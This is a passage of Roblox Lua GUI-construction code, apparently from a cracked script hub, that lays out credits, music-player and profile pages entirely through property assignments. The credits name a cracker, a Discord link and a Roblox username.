a.creditsicon.Name = "creditsicon"
a.creditsicon.Parent = a.CreditsButton
a.creditsicon.Active = true
a.creditsicon.BackgroundTransparency = 1.000
a.creditsicon.Position = UDim2.new(0, 12, 0, 0)
a.creditsicon.Size = UDim2.new(0, 16, 0, 26)
a.creditsicon.Image = "http://www.roblox.com/asset/?id=7898783712"
a.creditsicon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.creditsicon.ScaleType = Enum.ScaleType.Fit
a.shadow.Name = "shadow"
a.shadow.Parent = a.main
a.shadow.BackgroundTransparency = 1.000
a.shadow.Position = UDim2.new(0, -15, 0, -15)
a.shadow.Size = UDim2.new(1, 30, 1, 30)
a.shadow.Image = "rbxassetid://5028857084"
a.shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
a.shadow.ScaleType = Enum.ScaleType.Slice
a.shadow.SliceCenter = Rect.new(24, 24, 276, 276)
a.shadow.ImageTransparency = 1
a.UICorner_14.CornerRadius = UDim.new(0, 5)
a.UICorner_14.Parent = a.shadow
a.PagesFrame.Name = "PagesFrame"
a.PagesFrame.Parent = a.main
a.PagesFrame.Active = true
a.PagesFrame.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
a.PagesFrame.BackgroundTransparency = 1.000
a.PagesFrame.Position = UDim2.new(0.246575341, 0, 0.0887850448, 0)
a.PagesFrame.Size = UDim2.new(0, 385, 0, 390)
a.CreditsFrame.Name = "CreditsFrame"
a.CreditsFrame.Parent = a.PagesFrame
a.CreditsFrame.Active = true
a.CreditsFrame.BackgroundTransparency = 1.000
a.CreditsFrame.BorderSizePixel = 0
a.CreditsFrame.Position = UDim2.new(0, 6, 0, 9)
a.CreditsFrame.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.CreditsFrame.Visible = false
a.CreditsFrame.CanvasSize = UDim2.new(0, 0, 0, 604)
a.CreditsFrame.ScrollBarThickness = 3
a.UIListLayout_2.Parent = a.CreditsFrame
a.UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_2.Padding = UDim.new(0, 10)
a.credit.Name = "credit"
a.credit.Parent = a.CreditsFrame
a.credit.Active = true
a.credit.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.credit.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_15.CornerRadius = UDim.new(0, 3)
a.UICorner_15.Parent = a.credit
a.info.Name = "info"
a.info.Parent = a.credit
a.info.Active = true
a.info.BackgroundTransparency = 1.000
a.info.Position = UDim2.new(0, 8, 0, 8)
a.info.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_3.Parent = a.info
a.UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_3.Padding = UDim.new(0, 4)
a.Title.Name = "Title"
a.Title.Parent = a.info
a.Title.Active = true
a.Title.BackgroundTransparency = 1.000
a.Title.Size = UDim2.new(1, 0, 0, 20)
a.Title.Font = Enum.Font.GothamSemibold
a.Title.Text = "Info"
a.Title.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title.TextSize = 14.000
a.Title.TextXAlignment = Enum.TextXAlignment.Left
a.scripterframe.Name = "scripterframe"
a.scripterframe.Parent = a.CreditsFrame
a.scripterframe.Active = true
a.scripterframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.scripterframe.Size = UDim2.new(1, -10, 0, 138)
a.UICorner_16.CornerRadius = UDim.new(0, 3)
a.UICorner_16.Parent = a.scripterframe
a.Frame.Parent = a.scripterframe
a.Frame.Active = true
a.Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.Frame.BorderSizePixel = 0
a.Frame.Position = UDim2.new(0, 8, 0, 8)
a.Frame.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_4.Parent = a.Frame
a.UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_4.Padding = UDim.new(0, 4)
a.TextLabel.Parent = a.Frame
a.TextLabel.Active = true
a.TextLabel.BackgroundTransparency = 1.000
a.TextLabel.Position = UDim2.new(-0.0231884066, 0, -0.229508191, 0)
a.TextLabel.Size = UDim2.new(1, 0, 0, 20)
a.TextLabel.Font = Enum.Font.GothamSemibold
a.TextLabel.Text = "Scripter & Gui"
a.TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel.TextSize = 14.000
a.TextLabel.TextXAlignment = Enum.TextXAlignment.Left
a.chopex.Name = "chopex"
a.chopex.Parent = a.Frame
a.chopex.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.chopex.Position = UDim2.new(0, 0, 0.196721315, 0)
a.chopex.Size = UDim2.new(1, 0, 0, 30)
a.chopex.Font = Enum.Font.SourceSansBold
a.chopex.Text = "Cracked by juN#0707"
a.chopex.TextColor3 = Color3.fromRGB(255, 255, 255)
a.chopex.TextSize = 14.000
a.UICorner_17.CornerRadius = UDim.new(0, 3)
a.UICorner_17.Parent = a.chopex
a.yenilmezxxgg.Name = "juN#0707"
a.yenilmezxxgg.Parent = a.Frame
a.yenilmezxxgg.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.yenilmezxxgg.Position = UDim2.new(0, 0, 0.196721315, 0)
a.yenilmezxxgg.Size = UDim2.new(1, 0, 0, 30)
a.yenilmezxxgg.Font = Enum.Font.SourceSansBold
a.yenilmezxxgg.Text = "Roblox Name: yenilmez_xxgg"
a.yenilmezxxgg.TextColor3 = Color3.fromRGB(255, 255, 255)
a.yenilmezxxgg.TextSize = 14.000
a.UICorner_18.CornerRadius = UDim.new(0, 3)
a.UICorner_18.Parent = a.yenilmezxxgg
a.discordlink.Name = "discordlink"
a.discordlink.Parent = a.Frame
a.discordlink.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.discordlink.Position = UDim2.new(0, 0, 0.196721315, 0)
a.discordlink.Size = UDim2.new(1, 0, 0, 30)
a.discordlink.Font = Enum.Font.SourceSansBold
a.discordlink.Text = "Discord: https://discord.gg/zUkucSd6RH"
a.discordlink.TextColor3 = Color3.fromRGB(255, 255, 255)
a.discordlink.TextSize = 14.000
a.UICorner_19.CornerRadius = UDim.new(0, 3)
a.UICorner_19.Parent = a.discordlink
a.UI.Name = "UI"
a.UI.Parent = a.CreditsFrame
a.UI.Active = true
a.UI.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.UI.Size = UDim2.new(1, -10, 0, 70)
a.UICorner_23.CornerRadius = UDim.new(0, 3)
a.UICorner_23.Parent = a.UI
a.Frame_3.Parent = a.UI
a.Frame_3.Active = true
a.Frame_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.Frame_3.BorderSizePixel = 0
a.Frame_3.Position = UDim2.new(0, 8, 0, 8)
a.Frame_3.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_6.Parent = a.Frame_3
a.UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_6.Padding = UDim.new(0, 4)
a.TextLabel_3.Parent = a.Frame_3
a.TextLabel_3.Active = true
a.TextLabel_3.BackgroundTransparency = 1.000
a.TextLabel_3.Size = UDim2.new(1, 0, 0, 20)
a.TextLabel_3.Font = Enum.Font.GothamSemibold
a.TextLabel_3.Text = "UI"
a.TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_3.TextSize = 14.000
a.TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
a.uimaker.Name = "uimaker"
a.uimaker.Parent = a.Frame_3
a.uimaker.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.uimaker.Position = UDim2.new(0, 0, 0.196721315, 0)
a.uimaker.Size = UDim2.new(1, 0, 0, 30)
a.uimaker.Font = Enum.Font.SourceSansBold
a.uimaker.Text = "UI : Chopex`#4545"
a.uimaker.TextColor3 = Color3.fromRGB(255, 255, 255)
a.uimaker.TextSize = 14.000
a.UICorner_24.CornerRadius = UDim.new(0, 3)
a.UICorner_24.Parent = a.uimaker
a.help.Name = "help"
a.help.Parent = a.CreditsFrame
a.help.Active = true
a.help.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.help.Position = UDim2.new(0, 0, 0.118598379, 0)
a.help.Size = UDim2.new(1, -10, -0.0566037744, 138)
a.UICorner_25.CornerRadius = UDim.new(0, 3)
a.UICorner_25.Parent = a.help
a.Frame_4.Parent = a.help
a.Frame_4.Active = true
a.Frame_4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.Frame_4.BorderSizePixel = 0
a.Frame_4.Position = UDim2.new(0, 8, 0, 8)
a.Frame_4.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_7.Parent = a.Frame_4
a.UIListLayout_7.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_7.Padding = UDim.new(0, 4)
a.TextLabel_4.Parent = a.Frame_4
a.TextLabel_4.Active = true
a.TextLabel_4.BackgroundTransparency = 1.000
a.TextLabel_4.Size = UDim2.new(1, 0, 0, 20)
a.TextLabel_4.Font = Enum.Font.GothamSemibold
a.TextLabel_4.Text = "Help"
a.TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_4.TextSize = 14.000
a.TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
a.version.Name = "version"
a.version.Parent = a.Frame_4
a.version.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.version.Position = UDim2.new(0, 0, 0.196721315, 0)
a.version.Size = UDim2.new(1, 0, 0, 30)
a.version.Font = Enum.Font.SourceSansBold
a.version.Text = "Version : 5.00"
a.version.TextColor3 = Color3.fromRGB(255, 255, 255)
a.version.TextSize = 14.000
a.UICorner_26.CornerRadius = UDim.new(0, 3)
a.UICorner_26.Parent = a.version
a.createdat.Name = "createdat"
a.createdat.Parent = a.Frame_4
a.createdat.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.createdat.Position = UDim2.new(0, 0, 0.196721315, 0)
a.createdat.Size = UDim2.new(1, 0, 0, 30)
a.createdat.Font = Enum.Font.SourceSansBold
a.createdat.Text = "Created At: 25.01.2022"
a.createdat.TextColor3 = Color3.fromRGB(255, 255, 255)
a.createdat.TextSize = 14.000
a.UICorner_27.CornerRadius = UDim.new(0, 3)
a.UICorner_27.Parent = a.createdat
a.MusicPlayerFrame.Name = "MusicPlayerFrame"
a.MusicPlayerFrame.Parent = a.PagesFrame
a.MusicPlayerFrame.Active = true
a.MusicPlayerFrame.BackgroundTransparency = 1.000
a.MusicPlayerFrame.BorderSizePixel = 0
a.MusicPlayerFrame.Position = UDim2.new(0, 6, 0, 9)
a.MusicPlayerFrame.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.MusicPlayerFrame.Visible = false
a.MusicPlayerFrame.CanvasSize = UDim2.new(0, 0, 0, 604)
a.MusicPlayerFrame.ScrollBarThickness = 3
a.UIListLayout_8.Parent = a.MusicPlayerFrame
a.UIListLayout_8.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_8.Padding = UDim.new(0, 10)
a.musop.Name = "musop"
a.musop.Parent = a.MusicPlayerFrame
a.musop.Active = true
a.musop.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.musop.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_28.CornerRadius = UDim.new(0, 3)
a.UICorner_28.Parent = a.musop
a.mujoc.Name = "mujoc"
a.mujoc.Parent = a.musop
a.mujoc.Active = true
a.mujoc.BackgroundTransparency = 1.000
a.mujoc.Position = UDim2.new(0, 8, 0, 8)
a.mujoc.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_9.Parent = a.mujoc
a.UIListLayout_9.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_9.Padding = UDim.new(0, 4)
a.Title_2.Name = "Title"
a.Title_2.Parent = a.mujoc
a.Title_2.Active = true
a.Title_2.BackgroundTransparency = 1.000
a.Title_2.Size = UDim2.new(1, 0, 0, 20)
a.Title_2.Font = Enum.Font.GothamSemibold
a.Title_2.Text = "Music Player"
a.Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_2.TextSize = 14.000
a.Title_2.TextXAlignment = Enum.TextXAlignment.Left
a.musicplay.Name = "musicplay"
a.musicplay.Parent = a.MusicPlayerFrame
a.musicplay.Active = true
a.musicplay.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.musicplay.Size = UDim2.new(1, -10, 0, 138)
a.UICorner_29.CornerRadius = UDim.new(0, 3)
a.UICorner_29.Parent = a.musicplay
a.Frame_5.Parent = a.musicplay
a.Frame_5.Active = true
a.Frame_5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.Frame_5.BorderSizePixel = 0
a.Frame_5.Position = UDim2.new(0, 8, 0, 8)
a.Frame_5.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_10.Parent = a.Frame_5
a.UIListLayout_10.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_10.Padding = UDim.new(0, 4)
a.TextLabel_5.Parent = a.Frame_5
a.TextLabel_5.Active = true
a.TextLabel_5.BackgroundTransparency = 1.000
a.TextLabel_5.Position = UDim2.new(-0.0231884066, 0, -0.229508191, 0)
a.TextLabel_5.Selectable = true
a.TextLabel_5.Size = UDim2.new(1, 0, 0, 30)
a.TextLabel_5.Font = Enum.Font.GothamSemibold
a.TextLabel_5.Text = "Music Play"
a.TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_5.TextSize = 14.000
a.TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
a.MusicIDHer.Name = "MusicIDHer"
a.MusicIDHer.Parent = a.Frame_5
a.MusicIDHer.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.MusicIDHer.BorderSizePixel = 0
a.MusicIDHer.Position = UDim2.new(0, 0, 0.0705557838, 0)
a.MusicIDHer.Size = UDim2.new(1, 0, 0, 30)
a.MusicIDHer.Font = Enum.Font.GothamBold
a.MusicIDHer.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
a.MusicIDHer.PlaceholderText = "Music ID Here"
a.MusicIDHer.Text = ""
a.MusicIDHer.TextColor3 = Color3.fromRGB(178, 178, 178)
a.MusicIDHer.TextSize = 14.000
a.MusicIDHer.TextWrapped = true
a.Play.Name = "Play"
a.Play.Parent = a.Frame_5
a.Play.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
a.Play.BorderSizePixel = 0
a.Play.Position = UDim2.new(0.0240963846, 0, 0.126466259, 0)
a.Play.Size = UDim2.new(1, 0, 0, 30)
a.Play.Font = Enum.Font.SourceSansBold
a.Play.Text = "Play"
a.Play.TextColor3 = Color3.fromRGB(178, 178, 178)
a.Play.TextScaled = true
a.Play.TextSize = 14.000
a.Play.TextWrapped = true
a.Stop.Name = "Stop"
a.Stop.Parent = a.Frame_5
a.Stop.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
a.Stop.BorderSizePixel = 0
a.Stop.Position = UDim2.new(0.507383406, 0, 0.126466259, 0)
a.Stop.Size = UDim2.new(1, 0, 0, 30)
a.Stop.Font = Enum.Font.SourceSansBold
a.Stop.Text = "Stop"
a.Stop.TextColor3 = Color3.fromRGB(178, 178, 178)
a.Stop.TextScaled = true
a.Stop.TextSize = 14.000
a.Stop.TextWrapped = true
a.musocselect.Name = "musocselect"
a.musocselect.Parent = a.MusicPlayerFrame
a.musocselect.Active = true
a.musocselect.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.musocselect.Position = UDim2.new(0, 0, -0.0835579485, 0)
a.musocselect.Size = UDim2.new(1, -10, 0.436657667, 138)
a.UICorner_30.CornerRadius = UDim.new(0, 3)
a.UICorner_30.Parent = a.musocselect
a.Frame_6.Parent = a.musocselect
a.Frame_6.Active = true
a.Frame_6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.Frame_6.BorderSizePixel = 0
a.Frame_6.Position = UDim2.new(0, 8, 0, 8)
a.Frame_6.Size = UDim2.new(1, -16, 1.01244605, -16)
a.UIListLayout_11.Parent = a.Frame_6
a.UIListLayout_11.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_11.Padding = UDim.new(0, 4)
a.TextLabel_6.Parent = a.Frame_6
a.TextLabel_6.Active = true
a.TextLabel_6.BackgroundTransparency = 1.000
a.TextLabel_6.Position = UDim2.new(-0.0231884066, 0, -0.229508191, 0)
a.TextLabel_6.Size = UDim2.new(1, 0, 0, 20)
a.TextLabel_6.Font = Enum.Font.GothamSemibold
a.TextLabel_6.Text = "Music Select"
a.TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_6.TextSize = 14.000
a.TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
a.BloodPOP.Name = "BloodPOP"
a.BloodPOP.Parent = a.Frame_6
a.BloodPOP.AnchorPoint = Vector2.new(0.5, 0)
a.BloodPOP.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.BloodPOP.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.BloodPOP.BorderSizePixel = 2
a.BloodPOP.Position = UDim2.new(0.520658612, 0, -4.53568596e-08, 0)
a.BloodPOP.Size = UDim2.new(1, 0, 0, 30)
a.BloodPOP.ZIndex = 2
a.BloodPOP.Font = Enum.Font.SourceSansBold
a.BloodPOP.Text = "Brooklyn Blood Pop! - SyKo"
a.BloodPOP.TextColor3 = Color3.fromRGB(204, 204, 204)
a.BloodPOP.TextScaled = true
a.BloodPOP.TextSize = 14.000
a.BloodPOP.TextWrapped = true
a.UICorner_31.CornerRadius = UDim.new(0, 4)
a.UICorner_31.Parent = a.BloodPOP
a.FashionWeek.Name = "FashionWeek"
a.FashionWeek.Parent = a.Frame_6
a.FashionWeek.AnchorPoint = Vector2.new(0.5, 0)
a.FashionWeek.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.FashionWeek.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.FashionWeek.BorderSizePixel = 2
a.FashionWeek.Position = UDim2.new(0.520658612, 0, 0.0743126348, 0)
a.FashionWeek.Size = UDim2.new(1, 0, 0, 30)
a.FashionWeek.ZIndex = 2
a.FashionWeek.Font = Enum.Font.SourceSansBold
a.FashionWeek.Text = "Fashion Week - Thybxlle"
a.FashionWeek.TextColor3 = Color3.fromRGB(204, 204, 204)
a.FashionWeek.TextScaled = true
a.FashionWeek.TextSize = 14.000
a.FashionWeek.TextWrapped = true
a.UICorner_32.CornerRadius = UDim.new(0, 4)
a.UICorner_32.Parent = a.FashionWeek
a.MyOrdinaryLife.Name = "MyOrdinaryLife"
a.MyOrdinaryLife.Parent = a.Frame_6
a.MyOrdinaryLife.AnchorPoint = Vector2.new(0.5, 0)
a.MyOrdinaryLife.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.MyOrdinaryLife.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.MyOrdinaryLife.BorderSizePixel = 2
a.MyOrdinaryLife.Position = UDim2.new(0.520658612, 0, 0.148625314, 0)
a.MyOrdinaryLife.Size = UDim2.new(1, 0, 0, 30)
a.MyOrdinaryLife.ZIndex = 2
a.MyOrdinaryLife.Font = Enum.Font.SourceSansBold
a.MyOrdinaryLife.Text = "My Ordinary Life - The Living Tombstone"
a.MyOrdinaryLife.TextColor3 = Color3.fromRGB(204, 204, 204)
a.MyOrdinaryLife.TextScaled = true
a.MyOrdinaryLife.TextSize = 14.000
a.MyOrdinaryLife.TextWrapped = true
a.UICorner_33.CornerRadius = UDim.new(0, 4)
a.UICorner_33.Parent = a.MyOrdinaryLife
a.Rockabye.Name = "Rockabye"
a.Rockabye.Parent = a.Frame_6
a.Rockabye.AnchorPoint = Vector2.new(0.5, 0)
a.Rockabye.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.Rockabye.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.Rockabye.BorderSizePixel = 2
a.Rockabye.Position = UDim2.new(0.520658612, 0, 0.222937986, 0)
a.Rockabye.Size = UDim2.new(1, 0, 0, 30)
a.Rockabye.ZIndex = 2
a.Rockabye.Font = Enum.Font.SourceSansBold
a.Rockabye.Text = "Rockabye(feat. Sean Paul & Anne-Marie) - Clean Bandit"
a.Rockabye.TextColor3 = Color3.fromRGB(204, 204, 204)
a.Rockabye.TextScaled = true
a.Rockabye.TextSize = 14.000
a.Rockabye.TextWrapped = true
a.UICorner_34.CornerRadius = UDim.new(0, 4)
a.UICorner_34.Parent = a.Rockabye
a.Temperature.Name = "Temperature"
a.Temperature.Parent = a.Frame_6
a.Temperature.AnchorPoint = Vector2.new(0.5, 0)
a.Temperature.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.Temperature.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.Temperature.BorderSizePixel = 2
a.Temperature.Position = UDim2.new(0.520658612, 0, 0.297250658, 0)
a.Temperature.Size = UDim2.new(1, 0, 0, 30)
a.Temperature.ZIndex = 2
a.Temperature.Font = Enum.Font.SourceSansBold
a.Temperature.Text = "Heathens Remix"
a.Temperature.TextColor3 = Color3.fromRGB(204, 204, 204)
a.Temperature.TextScaled = true
a.Temperature.TextSize = 14.000
a.Temperature.TextWrapped = true
a.UICorner_35.CornerRadius = UDim.new(0, 4)
a.UICorner_35.Parent = a.Temperature
a.caka9core.Name = "caka9core"
a.caka9core.Parent = a.Frame_6
a.caka9core.AnchorPoint = Vector2.new(0.5, 0)
a.caka9core.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.caka9core.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.caka9core.BorderSizePixel = 2
a.caka9core.Position = UDim2.new(0.520658612, 0, 0.371563345, 0)
a.caka9core.Size = UDim2.new(1, 0, 0, 30)
a.caka9core.ZIndex = 2
a.caka9core.Font = Enum.Font.SourceSansBold
a.caka9core.Text = "Cake - Melanie Martinez"
a.caka9core.TextColor3 = Color3.fromRGB(204, 204, 204)
a.caka9core.TextScaled = true
a.caka9core.TextSize = 14.000
a.caka9core.TextWrapped = true
a.UICorner_36.CornerRadius = UDim.new(0, 4)
a.UICorner_36.Parent = a.caka9core
a.cantholdus.Name = "cantholdus"
a.cantholdus.Parent = a.Frame_6
a.cantholdus.AnchorPoint = Vector2.new(0.5, 0)
a.cantholdus.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.cantholdus.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.cantholdus.BorderSizePixel = 2
a.cantholdus.Position = UDim2.new(0.520658612, 0, 0.445876032, 0)
a.cantholdus.Size = UDim2.new(1, 0, 0, 30)
a.cantholdus.ZIndex = 2
a.cantholdus.Font = Enum.Font.SourceSansBold
a.cantholdus.Text = "Can't Hold Us(feat. Ray Dalton) - Macklemore & Ryan Lewis"
a.cantholdus.TextColor3 = Color3.fromRGB(204, 204, 204)
a.cantholdus.TextScaled = true
a.cantholdus.TextSize = 14.000
a.cantholdus.TextWrapped = true
a.UICorner_37.CornerRadius = UDim.new(0, 4)
a.UICorner_37.Parent = a.cantholdus
a.deadtome.Name = "deadtome"
a.deadtome.Parent = a.Frame_6
a.deadtome.AnchorPoint = Vector2.new(0.5, 0)
a.deadtome.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.deadtome.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.deadtome.BorderSizePixel = 2
a.deadtome.Position = UDim2.new(0.520658612, 0, 0.520188689, 0)
a.deadtome.Size = UDim2.new(1, 0, 0, 30)
a.deadtome.ZIndex = 2
a.deadtome.Font = Enum.Font.SourceSansBold
a.deadtome.Text = "Dead To Me - Whales & Fraxo"
a.deadtome.TextColor3 = Color3.fromRGB(204, 204, 204)
a.deadtome.TextScaled = true
a.deadtome.TextSize = 14.000
a.deadtome.TextWrapped = true
a.UICorner_38.CornerRadius = UDim.new(0, 4)
a.UICorner_38.Parent = a.deadtome
a.idfc.Name = "idfc"
a.idfc.Parent = a.Frame_6
a.idfc.AnchorPoint = Vector2.new(0.5, 0)
a.idfc.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.idfc.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.idfc.BorderSizePixel = 2
a.idfc.Position = UDim2.new(0.520658612, 0, 0.594501376, 0)
a.idfc.Size = UDim2.new(1, 0, 0, 30)
a.idfc.ZIndex = 2
a.idfc.Font = Enum.Font.SourceSansBold
a.idfc.Text = "idfc - Blackbear"
a.idfc.TextColor3 = Color3.fromRGB(204, 204, 204)
a.idfc.TextScaled = true
a.idfc.TextSize = 14.000
a.idfc.TextWrapped = true
a.UICorner_39.CornerRadius = UDim.new(0, 4)
a.UICorner_39.Parent = a.idfc
a.shrek.Name = "shrek"
a.shrek.Parent = a.Frame_6
a.shrek.AnchorPoint = Vector2.new(0.5, 0)
a.shrek.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.shrek.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.shrek.BorderSizePixel = 2
a.shrek.Position = UDim2.new(0.520658612, 0, 0.668814063, 0)
a.shrek.Size = UDim2.new(1, 0, 0, 30)
a.shrek.ZIndex = 2
a.shrek.Font = Enum.Font.SourceSansBold
a.shrek.Text = "Shrek Antem"
a.shrek.TextColor3 = Color3.fromRGB(204, 204, 204)
a.shrek.TextScaled = true
a.shrek.TextSize = 14.000
a.shrek.TextWrapped = true
a.UICorner_40.CornerRadius = UDim.new(0, 4)
a.UICorner_40.Parent = a.shrek
a.ProfileFrame.Name = "ProfileFrame"
a.ProfileFrame.Parent = a.PagesFrame
a.ProfileFrame.Active = true
a.ProfileFrame.BackgroundTransparency = 1.000
a.ProfileFrame.BorderSizePixel = 0
a.ProfileFrame.Position = UDim2.new(0, 6, 0, 9)
a.ProfileFrame.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.ProfileFrame.Visible = false
a.ProfileFrame.CanvasSize = UDim2.new(0, 0, 0, 604)
a.ProfileFrame.ScrollBarThickness = 3
a.UIListLayout_12.Parent = a.ProfileFrame
a.UIListLayout_12.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_12.Padding = UDim.new(0, 10)
a.profitrol.Name = "profitrol"
a.profitrol.Parent = a.ProfileFrame
a.profitrol.Active = true
a.profitrol.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.profitrol.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_41.CornerRadius = UDim.new(0, 3)
a.UICorner_41.Parent = a.profitrol
a.profol.Name = "profol"
a.profol.Parent = a.profitrol
a.profol.Active = true
a.profol.BackgroundTransparency = 1.000
a.profol.Position = UDim2.new(0, 8, 0, 8)
a.profol.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_13.Parent = a.profol
a.UIListLayout_13.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_13.Padding = UDim.new(0, 4)
a.Title_3.Name = "Title"
a.Title_3.Parent = a.profol
a.Title_3.Active = true
a.Title_3.BackgroundTransparency = 1.000
a.Title_3.Size = UDim2.new(1, 0, 0, 20)
a.Title_3.Font = Enum.Font.GothamSemibold
a.Title_3.Text = "Profile"
a.Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_3.TextSize = 14.000
a.Title_3.TextXAlignment = Enum.TextXAlignment.Left
a.urinfo.Name = "urinfo"
a.urinfo.Parent = a.ProfileFrame
a.urinfo.Active = true
a.urinfo.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.urinfo.Position = UDim2.new(0, 0, 0.123989217, 0)
a.urinfo.Size = UDim2.new(1, -10, 0.229110509, 138)
a.UICorner_42.CornerRadius = UDim.new(0, 3)
a.UICorner_42.Parent = a.urinfo
a.Frame_7.Parent = a.urinfo
a.Frame_7.Active = true
a.Frame_7.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.Frame_7.BorderSizePixel = 0
a.Frame_7.Position = UDim2.new(0, 8, 0, 8)
a.Frame_7.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_14.Parent = a.Frame_7
a.UIListLayout_14.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_14.Padding = UDim.new(0, 4)
a.TextLabel_7.Parent = a.Frame_7
a.TextLabel_7.Active = true
a.TextLabel_7.BackgroundTransparency = 1.000
a.TextLabel_7.Position = UDim2.new(-0.0231884066, 0, -0.229508191, 0)
a.TextLabel_7.Selectable = true
a.TextLabel_7.Size = UDim2.new(1, 0, 0, 30)
a.TextLabel_7.Font = Enum.Font.GothamSemibold
a.TextLabel_7.Text = "Your Information"
a.TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_7.TextSize = 14.000
a.TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
a.TextLabel_8.Parent = a.Frame_7
a.TextLabel_8.Active = true
a.TextLabel_8.BackgroundTransparency = 1.000
a.TextLabel_8.Position = UDim2.new(0, 0, 0.10497845, 0)
a.TextLabel_8.Selectable = true
a.TextLabel_8.Size = UDim2.new(0.13333334, 0, 0, 30)
a.TextLabel_8.Font = Enum.Font.FredokaOne
a.TextLabel_8.Text = "Name:"
a.TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_8.TextSize = 14.000
a.TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
a.TextLabel_9.Parent = a.Frame_7
a.TextLabel_9.Active = true
a.TextLabel_9.BackgroundTransparency = 1.000
a.TextLabel_9.Position = UDim2.new(0, 0, 0.10497845, 0)
a.TextLabel_9.Selectable = true
a.TextLabel_9.Size = UDim2.new(0.275362313, 0, 0, 30)
a.TextLabel_9.Font = Enum.Font.FredokaOne
a.TextLabel_9.Text = "Display Name:"
a.TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_9.TextSize = 14.000
a.TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left
